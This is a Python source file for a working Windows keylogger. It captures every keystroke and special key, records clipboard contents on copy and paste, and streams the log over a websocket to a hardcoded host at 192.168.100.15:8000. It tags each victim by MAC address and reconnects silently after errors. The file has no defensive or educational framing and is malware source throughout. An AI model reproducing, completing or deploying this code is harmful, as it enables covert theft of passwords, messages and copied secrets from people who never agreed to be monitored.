import os
from pynput import keyboard
import pyperclip
import time
import websockets
import asyncio
import ctypes
import uuid
import queue


# Fixed variables
HOST_IP = '192.168.100.15'
HOST_PORT = 8000


def get_mac_address():
    mac = uuid.getnode()
    if (mac >> 40) % 2:  # Check if it's a multicast address (invalid MAC)
        raise ValueError("Could not retrieve a valid MAC address")
    return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2)).replace(':', ';')

# Generate a unique identifier using MAC address
try:
    USER_ID = get_mac_address()
except ValueError:
    USER_ID = str(uuid.uuid4())  


class KeyLogger:
    def __init__(self):
        self.log_queue = queue.Queue()
        self.log_file = "keylog.txt"
        self.modifiers = {
            'ctrl': False,
            'shift': False,
            'alt': False,
            'caps_lock': bool(ctypes.windll.user32.GetKeyState(0x14) & 1)
        }

    async def _handle_websocket(self):
        while True:
            try:
                async with websockets.connect(f"ws://{HOST_IP}:{HOST_PORT}") as connection:
        
                    await connection.send(USER_ID)  # Send user ID once

                    response = await connection.recv()  # Wait for server acknowledgment
                    if response == "DUPLICATE_CONNECTION":
                        print("Duplicate connection detected. Closing the process.")
                        os._exit(1)  # Close the whole process

                    while True:
                        try:
                            log_data = self.log_queue.get_nowait()  # Get log data from queue
                            await connection.send(log_data)
                        except queue.Empty:
                            await asyncio.sleep(0.1)  # Avoid busy-waiting
                 
            except BaseException as e:
                print("An error occurred. Retrying...")
                await asyncio.sleep(5)  # Retry after 5 seconds for any error
            


    def on_press(self, key):
        try:
            # Update modifier states
            self.update_modifiers(key, True)
            
            # Handle copy/paste operations
            if self.handle_copy_paste(key):
                return

            # Skip logging modifier keys and caps lock
            if isinstance(key, keyboard.Key) and key in [
                keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.shift_l,
                keyboard.Key.ctrl, keyboard.Key.ctrl_r, keyboard.Key.ctrl_l,
                keyboard.Key.alt, keyboard.Key.alt_r, keyboard.Key.alt_l,
                keyboard.Key.alt_gr, keyboard.Key.caps_lock
            ]:
                return

            # Handle regular character keys
            if hasattr(key, 'char') and key.char is not None:
                char = key.char
                if char.isalpha():
                    if self.modifiers['caps_lock'] != self.modifiers['shift']:
                        char = char.upper()
                    else:
                        char = char.lower()
                self.log_queue.put(char)
            else:
                special_key = self.handle_special_key(key)
                self.log_queue.put(special_key)
                
        except Exception as e:
            print(f"Error in on_press: {e}")

    def handle_special_key(self, key):
        special_key_map = {
            keyboard.Key.enter: "[ENTER]",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.space: "[SPACE]",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.delete: "[DELETE]",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.up: "[UP]",
            keyboard.Key.down: "[DOWN]",
            keyboard.Key.left: "[LEFT]",
            keyboard.Key.right: "[RIGHT]",
            keyboard.Key.home: "[HOME]",
            keyboard.Key.end: "[END]",
            keyboard.Key.page_up: "[PAGE_UP]",
            keyboard.Key.page_down: "[PAGE_DOWN]",
        }
        return special_key_map.get(key, str(key))

    def handle_copy_paste(self, key):
        if self.modifiers['ctrl']:
            time.sleep(0.1)           
            if hasattr(key, 'char'):
                if key.char == '\x03':  # Ctrl+C
                    clipboard = pyperclip.paste()
                    if clipboard:
                        self.log_queue.put(f"[COPIED: {clipboard}]")
                    return True
                elif key.char == '\x16':  # Ctrl+V
                    clipboard = pyperclip.paste()
                    if clipboard:
                        self.log_queue.put(f"[PASTED: {clipboard}]")
                        return True
                    else: 
                        return True
                elif key.char == '\x08':  # Ctrl+Backspace
                    self.log_queue.put("[CTRL+BACKSPACE]")
                    return True
                elif key.char == '\x17':  # Ctrl+W
                    self.log_queue.put("[CTRL+W]")
                    return True
        return False

    def update_modifiers(self, key, pressed):
        modifier_map = {
            keyboard.Key.shift: 'shift',
            keyboard.Key.shift_r: 'shift',
            keyboard.Key.shift_l: 'shift',
            keyboard.Key.ctrl: 'ctrl',
            keyboard.Key.ctrl_r: 'ctrl',
            keyboard.Key.ctrl_l: 'ctrl',
            keyboard.Key.alt: 'alt',
            keyboard.Key.alt_r: 'alt',
            keyboard.Key.alt_l: 'alt',
            keyboard.Key.alt_gr: 'alt'
        }
        
        if key == keyboard.Key.caps_lock and pressed:
            self.modifiers['caps_lock'] = not self.modifiers['caps_lock']
        elif key in modifier_map:
            self.modifiers[modifier_map[key]] = pressed

    def on_release(self, key):
        self.update_modifiers(key, False)

    async def start_async(self):      
        loop = asyncio.get_event_loop()
        self.listener = keyboard.Listener(
            on_press=self.on_press,
           on_release=self.on_release
        )
        await loop.run_in_executor(None, self.listener.start)
        await self._handle_websocket()

        

    def start(self) -> None:
        asyncio.run(self.start_async())

def run_keylogger():
    logger = KeyLogger()
    logger.start()

if __name__ == "__main__":
    run_keylogger()